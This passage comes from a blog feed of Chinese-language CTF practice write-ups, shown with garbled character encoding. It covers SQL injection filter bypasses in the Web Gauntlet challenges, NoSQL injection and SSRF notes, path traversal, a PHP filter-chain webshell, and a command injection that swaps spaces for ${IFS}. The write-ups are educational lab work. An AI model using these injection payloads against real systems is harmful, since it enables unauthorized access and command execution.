<code>BE</code>ï¼Œå°±æˆåŠŸå¾—åˆ° flag äº†</p><figure><img data-src="https://i.imgur.com/FTfHNas.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬äº”é¡Œweb-gauntlet">ç¬¬äº”é¡Œï¼šWeb Gauntlet <a href="#ç¬¬äº”é¡Œweb-gauntlet" class="headerlink"></a></h3><h4 id="round-1">round 1 <a href="#round-1" class="headerlink"></a></h4><p>filter: <code>or</code><br>payload: <code>admin'; -- #</code></p><h4 id="round-2">round 2 <a href="#round-2" class="headerlink"></a></h4><p>filter: <code>or</code>, <code>and</code>, <code>like</code>,<code>=</code>, <code>--</code><br>payload: <code>admin'; #</code></p><h4 id="round-3">round 3 <a href="#round-3" class="headerlink"></a></h4><p>filter: <code>or</code>, <code>and</code>, <code>=</code>,<code>like</code>, <code>&gt;</code>, <code>&lt;</code>,<code>--</code></p><p>ä½†è©¦äº†å¥½ä¹…æ‰å¥¹å¥½åƒé‚„æ“‹äº†ç©ºç™½ OwO</p><p>payload: <code>admin';#</code></p><h4 id="round-4">round 4 <a href="#round-4" class="headerlink"></a></h4><p>filter: <code>or</code>, <code>and</code>, <code>=</code>,<code>like</code>, <code>&gt;</code>, <code>&lt;</code>,<code>--</code>, <code>admin</code></p><p>æŸ¥äº†ä¸€ä¸‹ç™¼ç¾ <code>||</code> å¯ä»¥æŠŠå…©å€‹å­—ä¸²é€£æ¥èµ·ä¾†ï¼Œæ‰€ä»¥æŠŠ<code>admin'</code> æ”¹æˆ <code>ad'||'min'</code> å°±å¯ä»¥äº†</p><p>payload: <code>ad'||'min';#</code></p><h4 id="round-5">round 5 <a href="#round-5" class="headerlink"></a></h4><p>filter: <code>or</code>, <code>and</code>, <code>=</code>,<code>like</code>, <code>&gt;</code>, <code>&lt;</code>,<code>--</code>, <code>union</code>, <code>admin</code></p><p>payload: <code>ad'||'min';#</code></p><p>ç„¶å¾Œåˆ° filter.php å°±å¯ä»¥çœ‹åˆ° flag äº†</p><figure><img data-src="https://i.imgur.com/Z5RkA1w.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬å…­é¡Œweb-gauntlet-2">ç¬¬å…­é¡Œï¼šWeb Gauntlet 2 <a href="#ç¬¬å…­é¡Œweb-gauntlet-2" class="headerlink"></a></h3><p>filter:<code>or and true false union like = &gt; &lt; ; -- /* */ admin</code></p><p>è©¦äº†æ‰ç™¼ç¾å¥½åƒ <code>#</code>æ ¹æœ¬æ²’æœ‰èµ·åˆ°è¨»è§£çš„ç”¨é€”ï¼Œå‰é¢å¥½åƒæ˜¯æ”¾è¾›é…¸çš„ï¼Œåªå¥½ä¿®æ”¹ password ä½¿å¾— queryæˆç«‹ï¼Œæ‰€ä»¥å°±æŠŠ password è¨­ç‚º <code>a' is not 'b</code> å°±å¯ä»¥äº†</p><p>payload: username <code>ad'||'min</code>, password<code>a' is not 'b</code></p><figure><img data-src="https://i.imgur.com/dZC96h4.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬ä¸ƒé¡Œweb-gauntlet-3">ç¬¬ä¸ƒé¡Œï¼šWeb Gauntlet 3 <a href="#ç¬¬ä¸ƒé¡Œweb-gauntlet-3" class="headerlink"></a></h3><p>é€™é¡Œå¥½åƒè·Ÿä¸Šä¸€é¡Œä¸€æ¨¡ä¸€æ¨£? å°±æŠŠä¸Šæçš„ payload ç…§æŠ„å°±éäº†</p><figure><img data-src="https://i.imgur.com/OvTrgIg.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;7 é¡Œ web&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day21</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day21/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day21/</id>
    <published>2024-09-23T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - åˆ° SSRF</a></label></li></ul><span id="more"></span><h2 id="ä¸Šèª²ç´€éŒ„">ä¸Šèª²ç´€éŒ„ <a href="#ä¸Šèª²ç´€éŒ„" class="headerlink"></a></h2><h3 id="nosql-injection">NoSQL Injection <a href="#nosql-injection" class="headerlink"></a></h3><p>NoSQL = Not Only SQL</p><p>æ¯”è¼ƒä¸€ä¸‹</p><figure><img data-src="https://i.imgur.com/ZYsqw9q.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>NoSQL çš„ç‰¹é»: ä¸ç”¨æå‰å®šç¾© schema ï¼Œçµæ§‹è¼ƒéˆæ´» ï¼Œæ›´å¤šçš„å„ªé»å¯ä»¥çœ‹ <a href="https://www.mongodb.com/nosql-explained/nosql-vs-sql">é€™è£¡</a></p><p>åè©ä¸Šçš„å®šç¾©æ¯”è¼ƒ</p><figure><img data-src="https://i.imgur.com/Dsv7wI0.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>ç¯„ä¾‹</p><figure><img data-src="https://i.imgur.com/E6kil0x.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/gTaY5Yx.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>No SQL Injection çš„ç²¾éš¨</p><figure><img data-src="https://i.imgur.com/1ajBcvD.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>åƒæ˜¯åˆ©ç”¨ <code>$ne</code> è¡¨ç¤ºä¸ç›¸ç­‰ï¼Œå› ç‚º <code>xxx</code>è·ŸçœŸæ­£çš„å¯†ç¢¼ä¸ä¸€æ¨£ï¼Œæ‰€ä»¥å°±æœƒé€šé—œ</p><figure><img data-src="https://i.imgur.com/xpYY8Bx.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å¦‚æœåªå›å‚³çµæœï¼Œä¸æŠŠç´°ç¯€è·Ÿä½ è¬›ï¼Œé€™æ¨£å°±ç®—æˆåŠŸç™»å…¥ï¼Œä¹Ÿä¸èƒ½çŸ¥é“çœŸæ­£çš„å¯†ç¢¼</p><figure><img data-src="https://i.imgur.com/jhFMvgw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å¯ä»¥ç”¨ regular expression ä¾†è¿­ä»£å˜—è©¦å‡ºçµæœï¼Œå°±è·Ÿæˆ‘ä¸Šæ¬¡å¯«çš„<code>dig blind</code> é“ç†ä¸€æ¨£</p><figure><img data-src="https://i.imgur.com/Lsb4yzt.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---no-sql-injection">Lab - no-sql-injection <a href="#lab---no-sql-injection" class="headerlink"></a></h3><p>Lab ä¼ºæœå™¨å¥½åƒæ›äº† qaq ï¼Œä¹‹å¾Œå†è©¦</p><h3 id="lab---no-sql-injection-blind">Lab - no-sql-injection-blind <a href="#lab---no-sql-injection-blind" class="headerlink"></a></h3><p>å¥½åƒä¹Ÿæ›äº† qaq ï¼Œä¹‹å¾Œå†è©¦</p><h3 id="ssrf-server-side-request-forgery">SSRF (Server-Side RequestForgery) <a href="#ssrf-server-side-request-forgery" class="headerlink"></a></h3><ul><li>ä¼ºæœå™¨ç«¯è«‹æ±‚å½é€  (Server-Side Request Forgery)</li><li>ç¹éé˜²ç«ç‰†ï¼Œå­˜å–å…§ç¶²è¨­å‚™</li><li>å¤šæ•¸è³‡æ–™åº«ã€ mail server ç­‰æ©Ÿæ•è¨­å‚™æœƒé¸æ“‡æ¶åœ¨å…§ç¶²</li></ul><h4 id="å…ˆå›çœ‹-url-çš„å®šç¾©-rfc3986">å…ˆå›çœ‹ url çš„å®šç¾© rfc3986 <a href="#å…ˆå›çœ‹-url-çš„å®šç¾©-rfc3986" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/ljodqkf.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/0KUwmy1.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å°æ–¼ scheme çš„åˆ©ç”¨</p><ol type="1"><li>æœ¬åœ°<br><img data-src="https://i.imgur.com/rEcHVqA.png" alt="Image"></li><li>php å½å”è­°<br><img data-src="https://i.imgur.com/9K9Ymzg.png" alt="Image"></li></ol><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV&quot;&gt;ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„
web3 - åˆ° SSRF&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day20</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day20/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day20/</id>
    <published>2024-09-22T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2 - Lab</a></label></li></ul><span id="more"></span><h2 id="ä¸Šèª²ç´€éŒ„">ä¸Šèª²ç´€éŒ„ <a href="#ä¸Šèª²ç´€éŒ„" class="headerlink"></a></h2><h3 id="lab---swirl">Lab - swirl <a href="#lab---swirl" class="headerlink"></a></h3><h4 id="stage-1-2">stage 1 &amp; 2 <a href="#stage-1-2" class="headerlink"></a></h4><p>é€™å…©é¡Œè·Ÿä¹‹å‰ Lab - phpisbest å·®ä¸å¤šï¼Œåªè¦åœ¨å¾Œé¢åŠ ä¸Š<code>/?A[]=[0]&amp;B[]=[3]</code> å°±èƒ½é”æˆå„ç¨® <code>null==null</code>å°±èƒ½éé—œäº†</p><h4 id="stage-3">stage 3 <a href="#stage-3" class="headerlink"></a></h4><p>é€™é¡Œæˆ‘æœ‰è§€å¯Ÿåˆ°å¯ä»¥ pathtraversalï¼Œä½†æ˜¯æˆ‘äº‚æˆ³æˆ³ä¸åˆ°æ±è¥¿ï¼Œéäº†å¤§æ¦‚ååˆ†é˜ï¼Œåˆæ²’å¿ä½é»äº†ä¸€ä¸‹ hintï¼Œæ‰ç™¼ç¾è¦æˆ³çš„æ±è¥¿å°±æ˜¯å¯«åœ¨åŸå§‹ç¢¼è£¡é¢çš„ <code>config.php</code>ï¼Œå°±èƒ½å‰å¾€ä¸‹ä¸€é—œäº†</p><figure><img data-src="https://i.imgur.com/xZD3Ha4.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/nLS1RQl.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="stage-4">stage 4 <a href="#stage-4" class="headerlink"></a></h4><p>é€™é¡Œå¥¹æ²’æœ‰ä¸€å€‹åœ°æ–¹è®€å– <code>ğŸ‘€</code> ï¼Œä½†æœ‰å€‹<code>extract($_POST)</code> å¯ä»¥åˆ©ç”¨ <code>POST</code> çš„æ–¹å¼è¼¸å…¥<code>ğŸ‘€</code> ï¼Œä¹‹å¾Œå°±è·Ÿ <code>lfi2rce</code> ä¸€æ¨£ï¼Œåˆ©ç”¨ <a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/blob/main/test.php">phpfilter chain æ§‹é€ å‡º webshell</a> ï¼Œå°±èƒ½å¾—åˆ° Flag äº†</p><figure><img data-src="https://i.imgur.com/J7iMxyo.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/MBxcvve.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>Note: é€™é‚Šè¦æ³¨æ„çš„æ˜¯é€™å€‹ webshell æŒ‡ä»¤æœ€å¾Œéœ€è¦çš„åƒæ•¸<code>1</code>ï¼Œä»–æ˜¯é€é <code>$_GET[1]</code>ä¾†å–å¾—çš„ï¼Œæ‰€ä»¥è¦å¯«åœ¨ç¶²å€å¾Œé¢è§£æï¼Œä¸æ˜¯å¯«åœ¨ POST è£¡é¢</p><h3 id="lab---fakelog">Lab - fakelog <a href="#lab---fakelog" class="headerlink"></a></h3><p>ä»–å¾ˆå¥½å¿ƒçš„çµ¦æˆ‘å€‘çœ‹äº†ä»–ç”Ÿæˆçš„åŸå§‹ç¢¼</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"no argument"</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    magic_num = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>]) <span class="keyword">if</span> sys.argv[<span class="number">1</span>].isdigit() <span class="keyword">else</span> sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> magic_num == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"0 is not allowed"</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">while</span> magic_num != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f"fakelog/<span class="subst">{magic_num % <span class="number">6</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(magic_num, <span class="built_in">int</span>) <span class="keyword">else</span> magic_num}</span>"</span>, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> fd:</span><br><span class="line">            <span class="built_in">print</span>(fd.read())</span><br><span class="line">        magic_num = <span class="number">3</span> * magic_num + <span class="number">1</span> <span class="keyword">if</span> magic_num % <span class="number">2</span> <span class="keyword">else</span> magic_num // <span class="number">2</span></span><br></pre></td></tr></tbody></table></figure><p>é‡é»æœ‰å…©å€‹</p><ol type="1"><li><code>magic_num = int(sys.argv[1]) if sys.argv[1].isdigit() else sys.argv[1]</code></li><li><code>with open(f"fakelog/{magic_num % 6 if isinstance(magic_num, int) else magic_num}", "r", encoding="utf-8") as fd:</code></li></ol><p>ä»–ä¸æœƒæª¢æŸ¥ magic numberæ˜¯æ–‡å­—ï¼Œè€Œä¸”åœ¨ä»–æ˜¯æ–‡å­—çš„æ™‚å€™ä»–é‚„æœƒç›´æ¥è®“æˆ‘å€‘è®€å–æª”æ¡ˆï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥åˆ©ç”¨é€™å€‹æ¼æ´ä¾†åšpath traversal</p><p>åˆå¯ä»¥å¾ Hint çš„ dockerfile ä¸­çŸ¥é“æœ‰å€‹å« <code>main.py</code>æ˜¯ä¸»ç¨‹å¼ï¼Œæ‹¿å‡ºä¾†çœ‹çœ‹</p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.10</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> curl -sSL https://install.python-poetry.org | POETRY_HOME=/etc/poetry python3 - </span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> pyproject.toml poetry.lock .</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> /etc/poetry/bin/poetry config virtualenvs.create <span class="literal">false</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    /etc/poetry/bin/poetry install</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . .</span></span><br><span class="line"><span class="keyword">ARG</span> FLAG</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt; /app/flag_`<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">'a-zA-Z0-9'</span> | <span class="built_in">fold</span> -w 8 | <span class="built_in">head</span> -n 1`</span></span><br><span class="line"><span class="keyword">USER</span> daemon </span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">"python"</span>, <span class="string">"/app/main.py"</span>]</span></span><br></pre></td></tr></tbody></table></figure><figure><img data-src="https://i.imgur.com/D41SaaE.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">result:</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, send_file</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/'</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">'home.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/howtogen'</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">howtogen</span>():</span><br><span class="line"><span class="keyword">return</span> send_file(<span class="string">'gen.py'</span>, mimetype=<span class="string">'text/plain'</span>, as_attachment=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/hint'</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line"><span class="keyword">return</span> send_file(<span class="string">'Dockerfile'</span>, mimetype=<span class="string">'text/plain'</span>, as_attachment=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/gen'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_input</span>():</span><br><span class="line">message = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">user_input = request.form[<span class="string">'user_input'</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="string">" "</span> <span class="keyword">in</span> user_input:</span><br><span class="line">result = <span class="string">"evil input"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">result = subprocess.run(</span><br><span class="line"><span class="string">f"python gen.py <span class="subst">{user_input}</span>"</span>, shell=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>).stdout.replace(<span class="string">'\', '</span><span class="string">')</span></span><br><span class="line"><span class="string">message = f"result: {result}"</span></span><br><span class="line"><span class="string">return render_template('</span>generate.html<span class="string">', message=message)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == "__main__":</span></span><br><span class="line"><span class="string">app.run(host='</span><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">', port=5050)</span></span><br></pre></td></tr></tbody></table></figure><p>å¯ä»¥çŸ¥é“ä¸èƒ½è¼¸å…¥ç©ºç™½ï¼Œå¦å¤–é‚„æœ‰ä»–åŸ·è¡Œç¨‹å¼çš„æ–¹æ³•æ˜¯</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">subprocess.run(</span><br><span class="line"><span class="string">f"python gen.py <span class="subst">{user_input}</span>"</span>, shell=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>).stdout.replace(<span class="string">'\', '</span><span class="string">')</span></span><br></pre></td></tr></tbody></table></figure><p>å¯ä»¥è®“æˆ‘å€‘åˆ©ç”¨é¡ä¼¼ <code>;id</code> é€™æ¨£çš„æ–¹å¼ä¾†é”åˆ° RCEï¼Œç©ºç™½å°±ç”¨<code>${IFS}</code> ä¾†ä»£æ›¿ï¼Œéš¨ä¾¿æˆ³æˆ³çœ‹ä¹‹å¾Œå°±èƒ½æ‹¿åˆ° Flag äº†</p><figure><img data-src="https://i.imgur.com/bsNKWDc.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/ea7xOKB.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/NXWwza5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a 